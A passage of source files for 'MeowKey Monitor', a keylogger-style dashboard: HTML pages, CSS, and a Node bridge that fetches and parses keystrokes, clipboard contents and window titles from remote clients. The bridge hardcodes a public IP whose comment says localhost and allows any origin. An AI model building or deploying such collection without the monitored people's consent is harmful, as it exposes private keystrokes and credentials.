                        <span class="setting-value" id="database-file">meowkey_server.db</span>
                    </div>
                    <div class="setting-item">
                        <span class="setting-label">Max File Size</span>
                        <span class="setting-value" id="max-file-size">100 MB</span>
                    </div>
                    <div class="setting-item">
                        <span class="setting-label">Max Clients</span>
                        <span class="setting-value" id="max-clients">1000</span>
                    </div>
                    <button class="btn-secondary" style="margin-top: 1rem; width: 100%;">
                        <i class="fas fa-sync-alt"></i> Reload Configuration
                    </button>
                </div>

                <!-- Monitoring Settings -->
                <div class="settings-card">
                    <h3>Monitoring Settings</h3>
                    <div class="setting-item">
                        <span class="setting-label">Keyboard Monitoring</span>
                        <span class="setting-value">Enabled</span>
                    </div>
                    <div class="setting-item">
                        <span class="setting-label">Clipboard Monitoring</span>
                        <span class="setting-value">Enabled (Requires Consent)</span>
                    </div>
                    <div class="setting-item">
                        <span class="setting-label">Window Monitoring</span>
                        <span class="setting-value">Enabled (Requires Consent)</span>
                    </div>
                    <div class="setting-item">
                        <span class="setting-label">Buffer Size</span>
                        <span class="setting-value">Keystrokes: 50, Clipboard: 5, Windows: 10</span>
                    </div>
                    <button class="btn-secondary" style="margin-top: 1rem; width: 100%;">
                        <i class="fas fa-edit"></i> Edit Monitoring Settings
                    </button>
                </div>

                <!-- Database Statistics -->
                <div class="settings-card">
                    <h3>Database Statistics</h3>
                    <div class="statistics-grid">
                        <div class="stat-row">
                            <span>File Size</span>
                            <span id="db-file-size" class="text-muted">0 MB / 100 MB</span>
                        </div>
                        <div class="stat-row">
                            <span>Used Space</span>
                            <span id="db-used-space" class="text-muted">0%</span>
                        </div>
                        <div class="stat-row">
                            <span>Total Clients</span>
                            <span id="db-total-clients" class="text-muted">0</span>
                        </div>
                        <div class="stat-row">
                            <span>Cached Clients</span>
                            <span id="db-cached-clients" class="text-muted">0</span>
                        </div>
                        <div class="stat-row">
                            <span>Free B+ Tree Nodes</span>
                            <span id="db-free-nodes" class="text-muted">0</span>
                        </div>
                        <div class="stat-row">
                            <span>Free Data Blocks</span>
                            <span id="db-free-blocks" class="text-muted">0</span>
                        </div>
                    </div>
                    <button class="btn-secondary" style="margin-top: 1rem; width: 100%;" id="flush-database">
                        <i class="fas fa-save"></i> Flush Database to Disk
                    </button>
                </div>

                <!-- System Control -->
                <div class="settings-card danger-zone">
                    <h3>System Control</h3>
                    <div class="setting-item">
                        <p class="text-muted">Control the monitoring server and perform system operations.</p>
                    </div>
                    <div style="display: flex; flex-direction: column; gap: 0.75rem; margin-top: 1rem;">
                        <button class="btn-secondary" id="view-server-logs">
                            <i class="fas fa-file-alt"></i> View Server Logs
                        </button>
                        <button class="btn-secondary" id="backup-database">
                            <i class="fas fa-database"></i> Backup Database
                        </button>
                        <button class="btn-danger" id="stop-server" style="margin-top: 1rem;">
                            <i class="fas fa-power-off"></i> Stop Server
                        </button>
                    </div>
                </div>
            </div>

            <!-- Quit Confirmation Modal -->
            <div class="modal" id="quit-modal">
                <div class="modal-content">
                    <div class="modal-header">
                        <h3>Stop Monitoring Server</h3>
                        <button class="close-modal" id="close-quit-modal">&times;</button>
                    </div>
                    <div class="modal-body">
                        <div class="setting-item">
                            <p>Are you sure you want to stop the monitoring server? This will:</p>
                            <ul style="margin: 0.75rem 0; padding-left: 1.5rem; color: #5f6368;">
                                <li>Disconnect all active clients</li>
                                <li>Stop all monitoring activities</li>
                                <li>Save current data to disk</li>
                                <li>Shut down the server process</li>
                            </ul>
                            <p class="text-muted" style="margin-top: 1rem;">This action requires administrator confirmation.</p>
                        </div>
                        <div class="setting-item" style="margin-top: 1.5rem;">
                            <span class="setting-label">Enter Password to Confirm</span>
                            <input type="password" id="admin-password" 
                                   style="width: 100%; padding: 0.5rem; border: 1px solid #e0e0e0; border-radius: 4px; margin-top: 0.375rem;"
                                   placeholder="Enter administrator password">
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button class="btn-secondary" id="cancel-quit">Cancel</button>
                        <button class="btn-danger" id="confirm-quit">Stop Server</button>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <p>MeowKey Monitoring System v1.0 | Secure Connection Established</p>
            <p class="timestamp" id="current-time"></p>
        </footer>
    </div>

    <script src="js/utils.js"></script>
    <script src="js/main.js"></script>
</body>
</html>

===== FILE: ./UI/css/style.css =====

/* Reset & Base Styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    background: #f5f5f5;
    color: #333;
    line-height: 1.6;
}

.container {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

/* Header Styles */
.header {
    background: white;
    border-bottom: 1px solid #e0e0e0;
    padding: 1rem 2rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
}

.logo h1 {
    font-size: 1.5rem;
    font-weight: 600;
    color: #1a73e8;
    margin-bottom: 0.25rem;
}

.subtitle {
    font-size: 0.875rem;
    color: #5f6368;
}

.nav {
    display: flex;
    align-items: center;
    gap: 2rem;
}

.nav-link {
    text-decoration: none;
    color: #5f6368;
    font-weight: 500;
    padding: 0.5rem 0;
    border-bottom: 2px solid transparent;
    transition: all 0.2s ease;
}

.nav-link:hover {
    color: #1a73e8;
}

.nav-link.active {
    color: #1a73e8;
    border-bottom-color: #1a73e8;
}

.nav-link i {
    margin-right: 0.5rem;
}

.status-indicator {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    padding: 0.5rem 1rem;
    background: #e8f0fe;
    border-radius: 20px;
}

.status-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: #dc3545;
}

.status-dot.active {
    background: #34a853;
}

.status-text {
    font-size: 0.875rem;
    color: #5f6368;
}

/* Main Content */
.main-content {
    flex: 1;
    padding: 2rem;
    max-width: 1400px;
    margin: 0 auto;
    width: 100%;
}

.dashboard-header {
    margin-bottom: 2rem;
}

.dashboard-header h2 {
    font-size: 1.75rem;
    font-weight: 600;
    color: #202124;
    margin-bottom: 1.5rem;
}

.stats-summary {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 1rem;
    margin-bottom: 2rem;
}

.stat-card {
    background: white;
    padding: 1.5rem;
    border-radius: 8px;
    border: 1px solid #e0e0e0;
    display: flex;
    flex-direction: column;
    align-items: center;
    transition: transform 0.2s ease;
}

.stat-card:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
}

.stat-value {
    font-size: 2.5rem;
    font-weight: 700;
    color: #1a73e8;
    line-height: 1;
    margin-bottom: 0.5rem;
}

.stat-label {
    font-size: 0.875rem;
    color: #5f6368;
    text-align: center;
}

/* Clients Grid */
.clients-grid {
    display: grid;
    gap: 1.5rem;
}

.empty-state {
    grid-column: 1 / -1;
    text-align: center;
    padding: 4rem 2rem;
    background: white;
    border-radius: 8px;
    border: 1px solid #e0e0e0;
}

.empty-state i {
    font-size: 4rem;
    color: #dadce0;
    margin-bottom: 1rem;
}

.empty-state h3 {
    font-size: 1.5rem;
    color: #5f6368;
    margin-bottom: 0.5rem;
}

.empty-state p {
    color: #80868b;
}

/* Client Card */
.client-card {
    background: white;
    border-radius: 8px;
    border: 1px solid #e0e0e0;
    overflow: hidden;
    transition: all 0.2s ease;
}

.client-card:hover {
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
}

.client-header {
    background: #f8f9fa;
    padding: 1rem 1.5rem;
    border-bottom: 1px solid #e0e0e0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.client-info {
    display: flex;
    align-items: center;
    gap: 1rem;
}

.client-avatar {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    background: #1a73e8;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 600;
    font-size: 1.125rem;
}

.client-details h3 {
    font-size: 1.125rem;
    font-weight: 600;
    color: #202124;
    margin-bottom: 0.25rem;
}

.client-details p {
    font-size: 0.875rem;
    color: #5f6368;
}

.client-status {
    display: flex;
    align-items: center;
    gap: 0.75rem;
}

.connection-indicator {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.875rem;
}

.connection-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: #dc3545;
}

.connection-dot.connected {
    background: #34a853;
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

/* Client Content */
.client-content {
    padding: 1.5rem;
    display: grid;
    grid-template-columns: 2fr 1fr 1fr;
    gap: 1.5rem;
}

@media (max-width: 1200px) {
    .client-content {
        grid-template-columns: 1fr;
    }
}

/* Keystrokes Display */
.keystrokes-section h4 {
    font-size: 0.875rem;
    font-weight: 600;
    color: #5f6368;
    margin-bottom: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 0.05em;
}

.keystrokes-display {
    background: #f8f9fa;
    border-radius: 6px;
    padding: 1rem;
    min-height: 120px;
    overflow-x: auto;
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
    align-content: flex-start;
}

.keystroke {
    background: white;
    padding: 0.375rem 0.75rem;
    border-radius: 4px;
    border: 1px solid #e0e0e0;
    font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
    font-size: 0.875rem;
    color: #202124;
    transition: all 0.1s ease;
}

.keystroke.special {
    background: #e8f0fe;
    color: #1a73e8;
    border-color: #c7dbf8;
}

.keystroke.modifier {
    background: #fce8e6;
    color: #d93025;
    border-color: #f4c7c3;
}

/* Windows & Clipboard Sections */
.windows-section,
.clipboard-section {
    min-width: 0;
}

.windows-section h4,
.clipboard-section h4 {
    font-size: 0.875rem;
    font-weight: 600;
    color: #5f6368;
    margin-bottom: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 0.05em;
}

.windows-list,
.clipboard-buttons {
    display: flex;
    flex-direction: column;
    gap: 0.75rem;
}

.window-item {
    background: white;
    border: 1px solid #e0e0e0;
    border-radius: 6px;
    padding: 0.75rem;
    font-size: 0.875rem;
    cursor: default;
    transition: all 0.2s ease;
}

.window-item:hover {
    border-color: #1a73e8;
    background: #f8f9fa;
}

.window-title {
    font-weight: 500;
    color: #202124;
    margin-bottom: 0.25rem;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.window-process {
    font-size: 0.75rem;
    color: #5f6368;
    font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
}

.clipboard-button {
    background: white;
    border: 1px solid #e0e0e0;
    border-radius: 6px;
    padding: 0.75rem;
    font-size: 0.875rem;
    text-align: left;
    cursor: pointer;
    transition: all 0.2s ease;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.clipboard-button:hover {
    border-color: #1a73e8;
    background: #f8f9fa;
}

.clipboard-time {
    font-size: 0.75rem;
    color: #5f6368;
}

/* Footer */
.footer {
    background: white;
    border-top: 1px solid #e0e0e0;
    padding: 1rem 2rem;
    text-align: center;
    color: #5f6368;
    font-size: 0.875rem;
}

.footer .timestamp {
    font-size: 0.75rem;
    color: #80868b;
    margin-top: 0.25rem;
}

/* Modal */
.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    z-index: 1000;
    align-items: center;
    justify-content: center;
}

.modal.show {
    display: flex;
}

.modal-content {
    background: white;
    border-radius: 8px;
    width: 90%;
    max-width: 600px;
    max-height: 80vh;
    display: flex;
    flex-direction: column;
    box-shadow: 0 8px 32px rgba(0,0,0,0.2);
}

.modal-header {
    padding: 1.5rem;
    border-bottom: 1px solid #e0e0e0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.modal-header h3 {
    font-size: 1.25rem;
    font-weight: 600;
    color: #202124;
}

.close-modal {
    background: none;
    border: none;
    font-size: 1.5rem;
    color: #5f6368;
    cursor: pointer;
    padding: 0.25rem;
    line-height: 1;
}

.close-modal:hover {
    color: #d93025;
}

.modal-body {
    padding: 1.5rem;
    flex: 1;
    overflow-y: auto;
}

.clipboard-meta {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 1rem;
    padding-bottom: 1rem;
    border-bottom: 1px solid #e0e0e0;
}

.client-id {
    font-weight: 500;
    color: #202124;
}

.clipboard-content {
    background: #f8f9fa;
    border-radius: 6px;
    padding: 1rem;
    font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
    font-size: 0.875rem;
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 300px;
    overflow-y: auto;
}

.modal-footer {
    padding: 1rem 1.5rem;
    border-top: 1px solid #e0e0e0;
    display: flex;
    justify-content: flex-end;
}

/* Buttons */
.btn-secondary {
    background: #1a73e8;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 0.5rem 1rem;
    font-size: 0.875rem;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s ease;
}

.btn-secondary:hover {
    background: #0d62d9;
}

.btn-danger {
    background: #dc3545;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 0.375rem 0.75rem;
    font-size: 0.75rem;
    cursor: pointer;
    transition: background 0.2s ease;
}

.btn-danger:hover {
    background: #c82333;
}

/* Waiting Room Styles */
.pending-clients {
    background: white;
    border-radius: 8px;
    border: 1px solid #e0e0e0;
    overflow: hidden;
}

.pending-client {
    padding: 1rem 1.5rem;
    border-bottom: 1px solid #e0e0e0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.pending-client:last-child {
    border-bottom: none;
}

.pending-info h4 {
    font-size: 1rem;
    font-weight: 600;
    color: #202124;
    margin-bottom: 0.25rem;
}

.pending-info p {
    font-size: 0.875rem;
    color: #5f6368;
}

.pending-actions {
    display: flex;
    gap: 0.75rem;
}

.btn-success {
    background: #34a853;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 0.375rem 0.75rem;
    font-size: 0.75rem;
    cursor: pointer;
    transition: background 0.2s ease;
}

.btn-success:hover {
    background: #2e8b47;
}

/* Settings Page */
.settings-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 1.5rem;
}

.settings-card {
    background: white;
    border-radius: 8px;
    border: 1px solid #e0e0e0;
    padding: 1.5rem;
}

.settings-card h3 {
    font-size: 1.125rem;
    font-weight: 600;
    color: #202124;
    margin-bottom: 1rem;
}

.setting-item {
    margin-bottom: 1rem;
}

.setting-item:last-child {
    margin-bottom: 0;
}

.setting-label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: #5f6368;
    margin-bottom: 0.375rem;
}

.setting-value {
    font-size: 0.875rem;
    color: #202124;
}

.statistics-grid {
    display: grid;
    gap: 0.75rem;
}

.stat-row {
    display: flex;
    justify-content: space-between;
    padding: 0.5rem 0;
    border-bottom: 1px solid #f0f0f0;
}

.stat-row:last-child {
    border-bottom: none;
}

.danger-zone {
    border-color: #fce8e6;
    background: #fff8f8;
}

.danger-zone h3 {
    color: #d93025;
}

/* Utility Classes */
.text-muted {
    color: #5f6368;
}

.text-small {
    font-size: 0.75rem;
}

/* Scrollbar Styling */
::-webkit-scrollbar {
    width: 8px;
    height: 8px;
}

::-webkit-scrollbar-track {
    background: #f1f1f1;
    border-radius: 4px;
}

::-webkit-scrollbar-thumb {
    background: #c1c1c1;
    border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
    background: #a8a8a8;
}

===== FILE: ./UI/waiting_room.html =====

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting Room - MeowKey Monitor</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <h1>MeowKey Monitor</h1>
                <p class="subtitle">Client Approval Queue</p>
            </div>
            <nav class="nav">
                <a href="index.html" class="nav-link"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
                <a href="waiting_room.html" class="nav-link active"><i class="fas fa-user-clock"></i> Waiting Room</a>
                <a href="clients.html" class="nav-link"><i class="fas fa-users"></i> Clients</a>
                <a href="settings.html" class="nav-link"><i class="fas fa-cog"></i> Settings</a>
                <div class="status-indicator">
                    <span class="status-dot active"></span>
                    <span class="status-text">Server: Online</span>
                </div>
            </nav>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="dashboard-header">
                <h2>Pending Client Approvals</h2>
                <div class="stats-summary">
                    <div class="stat-card">
                        <span class="stat-value" id="pending-count">0</span>
                        <span class="stat-label">Pending Clients</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="approved-today">0</span>
                        <span class="stat-label">Approved Today</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="rejected-today">0</span>
                        <span class="stat-label">Rejected Today</span>
                    </div>
                </div>
            </div>

            <!-- Pending Clients List -->
            <div class="pending-clients" id="pending-clients-container">
                <div class="empty-state">
                    <i class="fas fa-check-circle"></i>
                    <h3>No Pending Clients</h3>
                    <p>All client requests have been processed</p>
                </div>
            </div>

            <!-- Instructions -->
            <div class="settings-card" style="margin-top: 2rem;">
                <h3>Approval Guidelines</h3>
                <div class="setting-item">
                    <p class="text-muted">Review each client request carefully before approval. Only approve clients you recognize and trust.</p>
                </div>
                <div class="statistics-grid">
                    <div class="stat-row">
                        <span>Automatic Approval</span>
                        <span class="text-muted">Disabled</span>
                    </div>
                    <div class="stat-row">
                        <span>Default Monitoring</span>
                        <span class="text-muted">Keyboard & Clipboard</span>
                    </div>
                    <div class="stat-row">
                        <span>Session Timeout</span>
                        <span class="text-muted">8 hours</span>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <p>MeowKey Monitoring System v1.0 | Secure Connection Established</p>
            <p class="timestamp" id="current-time"></p>
        </footer>
    </div>

    <script src="js/utils.js"></script>
    <script src="js/main.js"></script>
</body>
</html>

===== FILE: ./UI/package.json =====

{
  "name": "meowkey-monitor-ui",
  "version": "1.0.0",
  "description": "Web UI for MeowKey Monitoring System",
  "main": "api/server.js",
  "scripts": {
    "start": "node api/server.js",
    "dev": "nodemon api/server.js"
  },
  "dependencies": {
    "express": "^4.18.2"
  },
  "devDependencies": {
    "nodemon": "^3.0.1"
  },
  "author": "MeowKey Team",
  "license": "MIT"
}



===== FILE: ./UI/api/server.js =====

// UI/api/server.js - Complete JSON API Bridge
const express = require('express');
const http = require('http');
const net = require('net');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

// Configuration - Use localhost since both servers are on same machine
const API_HOST = process.env.API_HOST || '13.48.25.178'; // Changed to localhost
const API_PORT = process.env.API_PORT || 3002; // C++ JSON API port
const UI_PORT = process.env.UI_PORT || 3000; // Web UI port
const DB_PATH = process.env.DB_PATH || '../meowkey_server.db'; // Adjusted path

// Global state
let apiConnected = false;
let apiConnectionAttempts = 0;
const MAX_RETRIES = 10;

// Utility functions
function formatTimestamp(timestamp) {
    if (!timestamp || timestamp === 0) return 'Unknown';
    
    try {
        // Handle microseconds timestamp from C++ (divide by 1000 to get milliseconds)
        const date = new Date(parseInt(timestamp) / 1000);
        const now = new Date();
        const diffMs = now - date;
        const diffMins = Math.floor(diffMs / 60000);
        const diffHours = Math.floor(diffMs / 3600000);
        const diffDays = Math.floor(diffMs / 86400000);

        if (diffMins < 1) return 'Just now';
        if (diffMins < 60) return `${diffMins}m ago`;
        if (diffHours < 24) return `${diffHours}h ago`;
        if (diffDays < 7) return `${diffDays}d ago`;
        
        return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
    } catch (e) {
        return 'Unknown';
    }
}

// Improved sendToAPI function
async function sendToAPI(command, data = {}, retries = 3) {
    console.log(`ðŸ“¤ Sending API command: ${command}`, data);
    
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const response = await sendToAPISingle(command, data);
            return response;
        } catch (error) {
            console.error(`API attempt ${attempt}/${retries} failed:`, error.message);
            
            if (attempt === retries) {
                throw error;
            }
            
            // Wait before retry
            await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
        }
    }
}

// Single attempt to send to API with improved handling
async function sendToAPISingle(command, data = {}) {
    return new Promise((resolve, reject) => {
        const socket = new net.Socket();
        const timeout = 15000; // 15 seconds timeout for commands
        
        const jsonData = JSON.stringify({
            command: command,
            ...data
        }) + '\n';
        
        let responseData = '';
        let responseTimeout;
        
        const cleanup = () => {
            clearTimeout(responseTimeout);
            if (socket && !socket.destroyed) {
                socket.destroy();
            }
        };
        
        socket.on('connect', () => {
            console.log(`âœ… Connected to C++ API at ${API_HOST}:${API_PORT}`);
            socket.write(jsonData);
            
            // Set timeout for response
            responseTimeout = setTimeout(() => {
                cleanup();
                reject(new Error('Response timeout'));
            }, timeout);
        });
        
        socket.on('data', (chunk) => {
            responseData += chunk.toString();
            
            // Try to parse JSON if we have what looks like complete response
            if (responseData.includes('\n') || 
                (responseData.includes('{') && responseData.includes('}'))) {
                try {
                    const trimmed = responseData.trim();
                    if (trimmed) {
                        const response = JSON.parse(trimmed);
                        cleanup();
                        resolve(response);
                    }
                } catch (err) {
                    // Not JSON yet, continue collecting
                }
            }
        });
        
        socket.on('end', () => {
            cleanup();
            if (responseData.trim()) {
                try {
                    const response = JSON.parse(responseData.trim());
                    resolve(response);
                } catch (err) {
                    // Return raw response if not JSON
                    resolve({
                        status: 'success',
                        raw: responseData.trim(),
                        data: responseData.trim().split('\n').filter(line => line.trim())
                    });
                }
            } else {
                reject(new Error('No response from API'));
            }
        });
        
        socket.on('error', (err) => {
            cleanup();
            console.error(`âŒ Socket error: ${err.message}`);
            apiConnected = false;
            reject(err);
        });
        
        socket.on('timeout', () => {
            cleanup();
            console.error('â° Socket connection timeout');
            reject(new Error('Connection timeout'));
        });
        
        // Connect to the server
        socket.connect({
            host: API_HOST,
            port: API_PORT,
            timeout: 10000
        });
    });
}

// Parse command output into structured data
function parseCommandOutput(command, outputArray) {
    console.log(`Parsing ${command} output:`, outputArray);
    
    if (!outputArray || !Array.isArray(outputArray)) {
        return { raw: outputArray || '', command: command };
    }
    
    const output = outputArray.join('\n');
    
    switch (command) {
        case 'list':
            return parseListOutput(output);
        case 'clients':
            return parseClientsOutput(output);
        case 'stats':
            return parseStatsOutput(output);
        case 'view':
            return parseViewOutput(output);
        default:
            return { raw: output, command: command };
    }
}

function parseListOutput(output) {
    console.log('Parsing list output:', output);
    
    const lines = output.split('\n');
    const result = {
        pending: [],
        active: [],
        raw: output
    };
    
    let currentSection = null;
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        if (trimmed.startsWith('PENDING') || trimmed.includes('PENDING')) {
            currentSection = 'pending';
        } else if (trimmed.startsWith('ACTIVE') || trimmed.includes('ACTIVE')) {
            currentSection = 'active';
        } else if (trimmed.startsWith('  ') && !trimmed.includes('(none)')) {
            const clientId = trimmed.substring(2).trim();
            if (clientId && currentSection) {
                if (currentSection === 'pending') {
                    result.pending.push({
                        id: clientId,
                        status: 'pending',
                        connectedAt: Date.now()
                    });
                } else if (currentSection === 'active') {
                    result.active.push({
                        id: clientId,
                        status: 'active',
                        connectedAt: Date.now()
                    });
                }
            }
        } else if (trimmed.match(/^[a-zA-Z0-9_-]+$/)) {
            // Simple client ID on its own line
            if (currentSection === 'pending') {
                result.pending.push({
                    id: trimmed,
                    status: 'pending',
                    connectedAt: Date.now()
                });
            } else if (currentSection === 'active') {
                result.active.push({
                    id: trimmed,
                    status: 'active',
                    connectedAt: Date.now()
                });
            }
        }
    }
    
    return result;
}

function parseClientsOutput(output) {
    console.log('Parsing clients output:', output);
    
    const lines = output.split('\n');
    const result = {
        allClients: [],
        raw: output
    };
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        if (trimmed.startsWith('* ')) {
            // Parse: "* client-id | Sessions: X KS:Y CB:Z W:A"
            const parts = trimmed.substring(2).split('|');
            if (parts.length >= 1) {
                const clientId = parts[0].trim();
                const client = { 
                    id: clientId,
                    status: 'registered'
                };
                
                if (parts.length > 1) {
                    const stats = parts[1];
                    
                    // Parse using regex to be more robust
                    const sessionMatch = stats.match(/Sessions:\s*(\d+)/i);
                    if (sessionMatch) client.sessions = parseInt(sessionMatch[1]);
                    
                    const ksMatch = stats.match(/KS:\s*(\d+)/i);
                    if (ksMatch) client.keystrokes = parseInt(ksMatch[1]);
                    
                    const cbMatch = stats.match(/CB:\s*(\d+)/i);
                    if (cbMatch) client.clipboard = parseInt(cbMatch[1]);
                    
                    const winMatch = stats.match(/W:\s*(\d+)/i);
                    if (winMatch) client.windows = parseInt(winMatch[1]);
                    
                    // Calculate total events
                    client.totalEvents = (client.keystrokes || 0) + 
                                        (client.clipboard || 0) + 
                                        (client.windows || 0);
                }
                
                result.allClients.push(client);
            }
        } else if (trimmed && !trimmed.includes('ALL REGISTERED') && !trimmed.includes('(no clients)')) {
            // Handle simple client ID lines
            result.allClients.push({
                id: trimmed,
                status: 'registered',
                sessions: 0,
                keystrokes: 0,
                clipboard: 0,
                windows: 0,
                totalEvents: 0
            });
        }
    }
    
    return result;
}

function parseStatsOutput(output) {
    console.log('Parsing stats output:', output);
    
    const lines = output.split('\n');
    const result = {
        raw: output,
        fileSize: '0 MB',
        usedSpace: '0 MB',
        usage: '0%',
        totalClients: 0,
        cachedClients: 0,
        freeNodes: 0,
        freeBlocks: 0
    };
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        if (trimmed.includes('File size:')) {
            result.fileSize = trimmed.split(':')[1].trim();
        } else if (trimmed.includes('Used space:')) {
            result.usedSpace = trimmed.split(':')[1].trim();
        } else if (trimmed.includes('Usage:')) {
            result.usage = trimmed.split(':')[1].trim();
        } else if (trimmed.includes('Total clients:')) {
            result.totalClients = parseInt(trimmed.split(':')[1].trim()) || 0;
        } else if (trimmed.includes('Cached clients:')) {
            result.cachedClients = parseInt(trimmed.split(':')[1].trim()) || 0;
        } else if (trimmed.includes('Free B+ tree nodes:')) {
            result.freeNodes = parseInt(trimmed.split(':')[1].trim()) || 0;
        } else if (trimmed.includes('Free data blocks:')) {
            result.freeBlocks = parseInt(trimmed.split(':')[1].trim()) || 0;
        }
    }
    
    return result;
}

function parseViewOutput(output) {
    console.log('Parsing view output:', output);
    
    const lines = output.split('\n');
    const result = {
        clientId: '',
        keystrokes: [],
        clipboard: [],
        windows: [],
        raw: output
    };
    
    let currentSection = null;
    let itemIndex = 0;
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        // Extract client ID
        if (trimmed.includes('DATA FOR CLIENT:')) {
            result.clientId = trimmed.split('DATA FOR CLIENT:')[1].trim();
            continue;
        }
        
        if (trimmed.includes('KEYSTROKES')) {
            currentSection = 'keystrokes';
            itemIndex = 0;
        } else if (trimmed.includes('CLIPBOARD')) {
            currentSection = 'clipboard';
            itemIndex = 0;
        } else if (trimmed.includes('WINDOWS')) {
            currentSection = 'windows';
            itemIndex = 0;
        } else if (trimmed.match(/^\d+\.\s+\[/)) {
            // Parse: "1. [timestamp] data"
            const match = trimmed.match(/^\s*(\d+)\.\s+\[(\d+)\]\s+(.+)$/);
            if (match) {
                itemIndex++;
                const timestamp = parseInt(match[2]);
                const data = match[3];
                
                const item = {
                    index: itemIndex,
                    timestamp: timestamp,
                    displayTime: formatTimestamp(timestamp)
                };
                
                switch (currentSection) {
                    case 'keystrokes':
                        item.key = data;
                        result.keystrokes.push(item);
                        break;
                    case 'clipboard':
                        item.content = data;
                        result.clipboard.push(item);
                        break;
                    case 'windows':
                        // Parse: "title [process]"
                        const winMatch = data.match(/(.+)\s+\[(.+)\]$/);
                        if (winMatch) {
                            item.title = winMatch[1].trim();
                            item.process = winMatch[2].trim();
                        } else {
                            item.title = data;
                            item.process = 'Unknown';
                        }
                        result.windows.push(item);
                        break;
                }
            }
        }
    }
    
    return result;
}

// Test API connection
async function testAPIConnection() {
    try {
        console.log(`ðŸ”Œ Testing connection to C++ API at ${API_HOST}:${API_PORT}...`);
        const response = await sendToAPISingle('ping');
        apiConnected = true;
        apiConnectionAttempts = 0;
        console.log('âœ… C++ API connection successful');
        return true;
    } catch (error) {
        apiConnected = false;
        apiConnectionAttempts++;
        
        const message = `âŒ C++ API connection failed (${apiConnectionAttempts}/${MAX_RETRIES}): ${error.message}`;
        if (apiConnectionAttempts <= MAX_RETRIES) {
            console.error(message);
        } else {
            console.error('âŒ C++ API connection failed after maximum retries');
        }
        return false;
    }
}

// Middleware setup
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    next();
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
    try {
        const response = await sendToAPI('ping');
        res.json({ 
            status: 'ok', 
            api: 'connected', 
            server: 'running',
            host: API_HOST,
            port: API_PORT,
            message: 'Server is running',
            ...response 
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            api: 'disconnected', 
            server: 'running',
            error: error.message,
            host: API_HOST,
            port: API_PORT,
            message: 'Cannot connect to C++ API'
        });
    }
});

// Get active and pending clients
app.get('/api/clients/list', async (req, res) => {
    try {
        console.log('ðŸ“‹ Getting clients list...');
        const response = await sendToAPI('list');
        console.log('List response:', response);
        
        const parsed = parseCommandOutput('list', response.data || response.raw);
        res.json({ 
            success: true, 
            ...parsed,
            message: `Found ${parsed.pending?.length || 0} pending and ${parsed.active?.length || 0} active clients` 
        });
